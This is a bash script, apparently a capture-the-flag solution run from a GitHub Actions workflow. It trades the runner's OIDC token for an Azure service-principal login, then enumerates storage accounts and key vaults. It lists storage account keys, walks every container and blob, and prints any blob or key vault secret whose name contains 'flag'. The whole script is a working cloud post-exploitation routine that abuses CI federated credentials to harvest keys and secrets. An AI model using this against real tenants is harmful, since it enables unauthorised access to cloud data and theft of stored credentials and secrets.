#!/usr/bin/env bash
set -euo pipefail

GH_OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')

az login --service-principal \
  -u "$AZURE_CLIENT_ID" \
  --tenant "$AZURE_TENANT_ID" \
  --federated-token "$GH_OIDC" \
  --allow-no-subscriptions >/dev/null
az account set --subscription "$AZURE_SUBSCRIPTION_ID" || true

echo "=== Storage accounts ==="
az storage account list -o table || true
echo "=== Key vaults ==="
az keyvault list -o table || true

echo "=== Scan storage blobs for flag ==="
for sa in $(az storage account list --query "[].name" -o tsv); do
  rg=$(az storage account show --name "$sa" --query resourceGroup -o tsv)
  key=$(az storage account keys list --account-name "$sa" --resource-group "$rg" --query "[0].value" -o tsv 2>/dev/null || true)
  [ -z "${key:-}" ] && continue
  for c in $(az storage container list --account-name "$sa" --account-key "$key" --query "[].name" -o tsv 2>/dev/null); do
    for b in $(az storage blob list --account-name "$sa" --container-name "$c" --account-key "$key" --query "[].name" -o tsv 2>/dev/null); do
      echo "-- $sa/$c/$b --"
      echo "$b" | grep -iq flag && az storage blob download --account-name "$sa" --container-name "$c" --name "$b" --account-key "$key" --file /dev/stdout 2>/dev/null && echo
    done
  done
done

echo "=== Scan key vault secrets for flag ==="
for kv in $(az keyvault list --query "[].name" -o tsv); do
  for s in $(az keyvault secret list --vault-name "$kv" --query "[].name" -o tsv 2>/dev/null); do
    echo "-- $kv/$s --"
    echo "$s" | grep -iq flag && az keyvault secret show --vault-name "$kv" --name "$s" --query value -o tsv 2>/dev/null
  done
done
